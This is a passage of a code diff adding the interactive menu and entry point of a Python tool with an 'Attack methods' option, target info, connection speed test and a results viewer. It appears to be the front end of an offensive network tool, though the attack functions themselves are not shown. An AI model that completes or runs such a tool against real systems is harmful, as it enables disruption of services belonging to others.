+            print(Fore.YELLOW + "Goodbye!")
+            break
+            
+        elif choice == '1':
+            # Attack methods
+            while True:
+                method_choice = show_attack_menu()
+                if method_choice == '0':
+                    break
+                
+                params = get_attack_parameters()
+                if params:
+                    results = run_attack(method_choice, params)
+                    if results:
+                        # Save results
+                        save_choice = input(Fore.CYAN + "\nSave results? (y/n): ").lower()
+                        if save_choice == 'y':
+                            results.update(params)
+                            save_results(results)
+                
+                input(Fore.CYAN + "\nPress Enter to continue...")
+        
+        elif choice == '2':
+            show_target_info()
+            
+        elif choice == '3':
+            test_connection_speed()
+            input(Fore.CYAN + "\nPress Enter to continue...")
+            
+        elif choice == '4':
+            print_banner()
+            print(Fore.LIGHTBLUE_EX + "🔹  CONFIGURATION MANAGER  🔹")
+            print()
+            print(Fore.YELLOW + "[1] Save Current Settings")
+            print(Fore.YELLOW + "[2] Load Saved Settings")
+            print(Fore.YELLOW + "[3] Back")
+            
+            config_choice = input(Fore.LIGHTBLUE_EX + "\nSelect: " + Fore.YELLOW).strip()
+            
+            if config_choice == '1':
+                config = {
+                    'whitelist': WHITELIST,
+                    'blacklist': BLACKLIST,
+                    'version': VERSION
+                }
+                save_config(config)
+            elif config_choice == '2':
+                loaded = load_config()
+                if loaded:
+                    # Tidak perlu deklarasi global lagi di sini
+                    WHITELIST = loaded.get('whitelist', WHITELIST)
+                    BLACKLIST = loaded.get('blacklist', BLACKLIST)
+            
+            input(Fore.CYAN + "\nPress Enter to continue...")
+            
+        elif choice == '5':
+            if os.path.exists(RESULTS_FILE):
+                print_banner()
+                print(Fore.LIGHTBLUE_EX + "🔹  PREVIOUS RESULTS  🔹")
+                print("\033[94m" + "="*40)
+                
+                try:
+                    with open(RESULTS_FILE, 'r') as f:
+                        content = f.read()
+                        print(content[-2000:])  # Show last 2000 chars
+                except:
+                    print(Fore.RED + "Could not read results file")
+            else:
+                print(Fore.YELLOW + "No results file found")
+            
+            input(Fore.CYAN + "\nPress Enter to continue...")
+            
+        elif choice == '6':
+            show_settings()
+
+# ============================================
+# ENTRY POINT
+# ============================================
 if __name__ == "__main__":
-    main()
+    try:
+        # Check if running as root (for some features)
+        if os.name == 'posix':
+            if os.geteuid() != 0:
+                print(Fore.YELLOW + "[⚠️] Some features may require root privileges")
+        
+        # Create results directory if it doesn't exist
+        if not os.path.exists("results"):
+            os.makedirs("results")
+        
+        # Start main application
+        main()
+        
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + "\n\n[⚠️] Program interrupted by user")
+        sys.exit(0)
+    except Exception as e:
+        print(Fore.RED + f"\n[❌] Fatal error: {e}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
